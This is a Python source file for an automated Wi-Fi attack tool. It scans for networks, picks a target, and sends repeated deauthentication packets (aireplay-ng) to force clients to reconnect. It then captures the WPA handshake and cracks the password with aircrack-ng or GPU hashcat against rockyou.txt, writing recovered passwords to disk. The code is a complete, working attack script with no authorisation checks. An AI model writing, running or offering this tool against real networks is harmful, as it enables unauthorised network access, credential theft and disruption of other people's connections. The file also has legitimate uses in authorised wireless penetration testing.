#!/usr/bin/env python3

from rich.console import Console
import subprocess
import time
import os
import shutil
from datetime import datetime
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    get_data_path,
    cleanup_temp_files
)
import json

class HandshakeCaptureV2:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.capture_file = None
        self.data_path = self._setup_data_paths()

    def _setup_data_paths(self):
        """Setup required data directories"""
        paths = {
            'captures': get_data_path('handshakes', ''),
            'passwords': get_data_path('passwords', '')
        }
        
        for path in paths.values():
            os.makedirs(path, exist_ok=True)
        
        return paths

    def scan_networks(self):
        """Scan for available networks"""
        try:
            # Create temporary file for scan results
            temp_file = f"/tmp/scan_{int(time.time())}"
            
            # Start airodump-ng scan
            scan_cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ]
            
            self.console.print("\n[yellow]Scanning for networks (10 seconds)...[/yellow]")
            
            scan_process = subprocess.Popen(
                scan_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(10)  # Scan for 10 seconds
            scan_process.terminate()
            time.sleep(1)  # Wait for files to be written
            
            networks = []
            try:
                with open(f"{temp_file}-01.csv", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    
                    for line in lines[2:]:  # Skip headers
                        if line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 14:  # Valid network line
                                essid = parts[13].strip()
                                if essid and essid != "":  # Only add networks with valid ESSID
                                    networks.append({
                                        'bssid': parts[0].strip(),
                                        'channel': parts[3].strip(),
                                        'essid': essid
                                    })
            except:
                pass
            finally:
                # Cleanup
                os.system(f"rm -f {temp_file}*")
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error scanning networks: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Let user select target network"""
        if not networks:
            self.console.print("[red]No networks found![/red]")
            return False
            
        self.console.print("\n[green]Available Networks:[/green]")
        for idx, network in enumerate(networks, 1):
            self.console.print(
                f"{idx}. {network['essid']} "
                f"(BSSID: {network['bssid']}, "
                f"Channel: {network['channel']})"
            )
        
        while True:
            try:
                choice = int(input("\nSelect target network (1-{}): ".format(len(networks))))
                if 1 <= choice <= len(networks):
                    network = networks[choice - 1]
                    self.target_bssid = network['bssid']
                    self.target_channel = network['channel']
                    self.target_essid = network['essid']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice![/red]")
        
        return False

    def capture_handshake(self):
        """Capture WPA handshake using targeted deauth"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.capture_file = os.path.join(
                self.data_path['captures'],
                f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}'
            )
            
            # Start airodump-ng to capture handshake
            capture_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', self.capture_file,
                '--output-format', 'pcap',
                self.interface
            ]
            
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Wait for airodump-ng to initialize
            time.sleep(2)
            
            # Get connected clients
            clients = self.get_connected_clients()
            
            if clients:
                self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                
                # Send deauth to each client
                for client in clients:
                    self.console.print(f"[cyan]Deauthenticating client: {client}[/cyan]")
                    
                    # Send 10 deauth packets
                    for _ in range(10):
                        deauth_cmd = [
                            'aireplay-ng',
                            '--deauth', '1',
                            '-a', self.target_bssid,
                            '-c', client,
                            self.interface
                        ]
                        subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.1)
                        
                        # Check for handshake
                        if self.verify_handshake():
                            capture_process.terminate()
                            return True
                    
                    time.sleep(0.5)  # Wait between clients
            else:
                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
                
                # Send broadcast deauth
                for _ in range(10):
                    deauth_cmd = [
                        'aireplay-ng',
                        '--deauth', '1',
                        '-a', self.target_bssid,
                        self.interface
                    ]
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.1)
                    
                    # Check for handshake
                    if self.verify_handshake():
                        capture_process.terminate()
                        return True
            
            capture_process.terminate()
            return self.verify_handshake()
            
        except Exception as e:
            self.console.print(f"[red]Error capturing handshake: {str(e)}[/red]")
            return False

    def get_connected_clients(self):
        """Get list of connected clients"""
        try:
            clients = set()
            temp_file = f"/tmp/clients_{int(time.time())}"
            
            # Monitor for clients
            monitor_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', temp_file,
                '--output-format', 'csv',
                self.interface
            ]
            
            process = subprocess.Popen(
                monitor_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(5)  # Monitor for 5 seconds
            process.terminate()
            
            # Parse results
            try:
                with open(f"{temp_file}-01.csv", 'r') as f:
                    lines = f.readlines()
                    
                    client_section = False
                    for line in lines:
                        if 'Station MAC' in line:
                            client_section = True
                            continue
                        if client_section and line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                clients.add(parts[0].strip())
            except:
                pass
            finally:
                os.system(f"rm -f {temp_file}*")
            
            return list(clients)
            
        except Exception as e:
            self.console.print(f"[red]Error getting clients: {str(e)}[/red]")
            return []

    def verify_handshake(self):
        """Verify if handshake was captured"""
        try:
            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                return False
                
            # Check with aircrack-ng
            cmd = ['aircrack-ng', capfile]
            process = subprocess.run(cmd, capture_output=True, text=True)
            return "1 handshake" in process.stdout
            
        except Exception as e:
            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
            return False

    def create_session(self, method, wordlist):
        """Create a cracking session for resume capability"""
        session_file = os.path.join(
            self.data_path['passwords'],
            f'session_{self.target_bssid.replace(":", "")}_{method}.session'
        )
        
        session_data = {
            'bssid': self.target_bssid,
            'essid': self.target_essid,
            'method': method,
            'wordlist': wordlist,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'progress': 0,
            'status': 'running'
        }
        
        with open(session_file, 'w') as f:
            json.dump(session_data, f)
            
        return session_file

    def load_session(self, session_file):
        """Load an existing cracking session"""
        try:
            with open(session_file, 'r') as f:
                return json.load(f)
        except:
            return None

    def update_session(self, session_file, progress, status='running'):
        """Update session progress"""
        try:
            session_data = self.load_session(session_file)
            if session_data:
                session_data['progress'] = progress
                session_data['status'] = status
                with open(session_file, 'w') as f:
                    json.dump(session_data, f)
        except:
            pass

    def crack_with_hashcat(self, capfile, wordlist):
        """Crack handshake using hashcat with GPU acceleration and session management"""
        try:
            # Convert cap to hccapx format for hashcat
            hccapx_file = os.path.join(self.data_path['passwords'], f'hash_{self.target_bssid.replace(":", "")}.hccapx')
            convert_cmd = [
                'cap2hccapx',
                capfile,
                hccapx_file
            ]
            subprocess.run(convert_cmd, check=True)

            if not os.path.exists(hccapx_file):
                self.console.print("[red]Failed to convert capture file to hashcat format[/red]")
                return False

            # Create or load session
            session_file = self.create_session('hashcat', wordlist)

            # Setup hashcat command with session and performance options
            hashcat_cmd = [
                'hashcat',
                '-m', '2500',      # WPA/WPA2 mode
                '-w', '3',         # Workload profile (1-4)
                '--status',        # Enable status updates
                '--restore',       # Enable session restore
                '--session', os.path.splitext(session_file)[0],  # Session name
                '-O',             # Optimize for performance
                '--gpu-temp-abort=90',  # Prevent GPU overheating
                '-o', os.path.join(self.data_path['passwords'], f'cracked_{self.target_bssid.replace(":", "")}.txt'),
                hccapx_file,
                wordlist
            ]

            # Ask for number of threads
            try:
                import multiprocessing
                max_threads = multiprocessing.cpu_count()
                threads = input(f"\nEnter number of threads (1-{max_threads}, default={max_threads}): ").strip()
                if threads.isdigit() and 1 <= int(threads) <= max_threads:
                    hashcat_cmd.extend(['-T', threads])
            except:
                pass

            process = subprocess.Popen(
                hashcat_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                universal_newlines=True
            )

            # Monitor progress
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break

                # Update progress based on hashcat output
                if "Progress" in line:
                    progress = line.strip().split()[-1].rstrip('%')
                    self.update_session(session_file, float(progress))
                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
                elif "Recovered" in line and "(" in line:
                    password = line.split("(")[1].split(")")[0].strip()
                    self.update_session(session_file, 100, 'completed')
                    return password

            self.update_session(session_file, 100, 'failed')
            return None

        except KeyboardInterrupt:
            self.console.print("\n[yellow]Cracking paused. Session saved.[/yellow]")
            self.update_session(session_file, -1, 'paused')
            return None
        except Exception as e:
            self.console.print(f"[red]Error during GPU cracking: {str(e)}[/red]")
            self.update_session(session_file, -1, 'error')
            return None

    def list_sessions(self):
        """List all available cracking sessions"""
        sessions = []
        for file in os.listdir(self.data_path['passwords']):
            if file.startswith('session_') and file.endswith('.session'):
                session_data = self.load_session(os.path.join(self.data_path['passwords'], file))
                if session_data:
                    sessions.append(session_data)
        return sessions

    def resume_session(self, session_data):
        """Resume a paused cracking session"""
        self.target_bssid = session_data['bssid']
        self.target_essid = session_data['essid']
        
        if session_data['method'] == 'hashcat':
            return self.crack_with_hashcat(self.capture_file, session_data['wordlist'])
        else:
            return self.crack_with_aircrack(self.capture_file, session_data['wordlist'])

    def crack_with_aircrack(self, capfile, wordlist):
        """CPU-based cracking using aircrack-ng"""
        try:
            password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
            
            crack_cmd = [
                'aircrack-ng',
                '-w', wordlist,
                '-l', password_file,
                '-b', self.target_bssid,
                capfile
            ]
            
            process = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                    
                if "KEY FOUND!" in line:
                    with open(password_file, 'r') as f:
                        return f.read().strip()
                elif "Tested" in line or "keys tested" in line.lower():
                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
            
            return None

        except Exception as e:
            self.console.print(f"[red]Error during CPU cracking: {str(e)}[/red]")
            return None

    def start_capture(self):
        """Main method to start handshake capture process"""
        try:
            # Get interface
            self.interface = get_interface()
            if not self.interface:
                return
            
            # Setup monitor mode
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return
            
            # Scan networks
            networks = self.scan_networks()
            if not self.select_target(networks):
                return
            
            self.console.print(f"\n[cyan]Starting capture for {self.target_essid}[/cyan]")
            
            if self.capture_handshake():
                self.console.print("\n[green]Handshake captured successfully![/green]")
                
                # Ask to crack
                if input("\nAttempt to crack the password? (y/n): ").lower() == 'y':
                    self.crack_handshake()
            else:
                self.console.print("\n[red]Failed to capture handshake![/red]")
            
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Capture stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")
        finally:
            # Cleanup
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                cleanup_temp_files()
            except:
                pass 

    def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Attempt to crack the captured handshake using both CPU and GPU methods with session support"""
        try:
            # Check for existing sessions first
            sessions = self.list_sessions()
            if sessions:
                self.console.print("\n[cyan]Found existing cracking sessions:[/cyan]")
                for idx, session in enumerate(sessions, 1):
                    status_color = {
                        'running': 'yellow',
                        'paused': 'cyan',
                        'completed': 'green',
                        'failed': 'red',
                        'error': 'red'
                    }.get(session['status'], 'white')
                    
                    self.console.print(
                        f"{idx}. {session['essid']} ({session['bssid']}) - "
                        f"Method: {session['method']}, "
                        f"Progress: [{status_color}]{session['progress']}%[/{status_color}], "
                        f"Status: [{status_color}]{session['status']}[/{status_color}]"
                    )
                
                choice = input("\nResume session number (or press Enter for new session): ").strip()
                if choice.isdigit() and 1 <= int(choice) <= len(sessions):
                    return self.resume_session(sessions[int(choice) - 1])

            # First check if we have a custom wordlist path in the data directory
            custom_wordlist = os.path.join(self.data_path['passwords'], 'wordlist.txt')
            if os.path.exists(custom_wordlist):
                wordlist = custom_wordlist
                self.console.print(f"[cyan]Using custom wordlist: {custom_wordlist}[/cyan]")
            elif not os.path.exists(wordlist):
                # Ask user for wordlist path if default doesn't exist
                self.console.print(f"[yellow]Default wordlist not found: {wordlist}[/yellow]")
                new_path = input("Enter path to wordlist (or press Enter to download rockyou.txt): ").strip()
                
                if new_path:
                    if os.path.exists(new_path):
                        wordlist = new_path
                    else:
                        self.console.print("[red]Invalid wordlist path![/red]")
                        return False
                else:
                    # Option to download rockyou.txt
                    self.console.print("[yellow]Attempting to download rockyou.txt...[/yellow]")
                    try:
                        download_cmd = [
                            'wget',
                            'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
                            '-O', custom_wordlist
                        ]
                        subprocess.run(download_cmd, check=True)
                        wordlist = custom_wordlist
                        self.console.print("[green]Successfully downloaded wordlist![/green]")
                    except:
                        self.console.print("[red]Failed to download wordlist. Please provide a valid wordlist path.[/red]")
                        return False

            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                self.console.print("[red]Capture file not found![/red]")
                return False

            # Ask user for cracking method preference
            self.console.print("\n[cyan]Available cracking methods:[/cyan]")
            self.console.print("1. CPU-based (aircrack-ng) - Slower but more compatible")
            self.console.print("2. GPU-based (hashcat) - Much faster, requires compatible GPU")
            
            choice = input("\nSelect cracking method (1/2): ").strip()
            
            if choice == "2":
                self.console.print("\n[yellow]Starting GPU-based cracking with hashcat...[/yellow]")
                password = self.crack_with_hashcat(capfile, wordlist)
            else:
                self.console.print("\n[yellow]Starting CPU-based cracking with aircrack-ng...[/yellow]")
                password = self.crack_with_aircrack(capfile, wordlist)

            if password:
                self.console.print(f"\n[green]Password found: {password}[/green]")
                
                # Save detailed results
                results_file = os.path.join(
                    self.data_path['passwords'],
                    f'details_{self.target_bssid.replace(":", "")}.txt'
                )
                
                with open(results_file, 'w') as f:
                    f.write("=== Cracking Results ===\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Network Name: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Channel: {self.target_channel}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Wordlist Used: {wordlist}\n")
                    f.write(f"Capture File: {capfile}\n")
                    f.write(f"Cracking Method: {'GPU (hashcat)' if choice == '2' else 'CPU (aircrack-ng)'}\n")
                
                self.console.print(f"[green]Full details saved to: {results_file}[/green]")
                return True
            
            self.console.print("\n[yellow]Password not found in wordlist. You can try:[/yellow]")
            self.console.print("1. Use a different wordlist")
            self.console.print("2. Try a different cracking method")
            self.console.print("3. Capture a new handshake")
            return False
            
        except Exception as e:
            self.console.print(f"[red]Error during password cracking: {str(e)}[/red]")
            return False 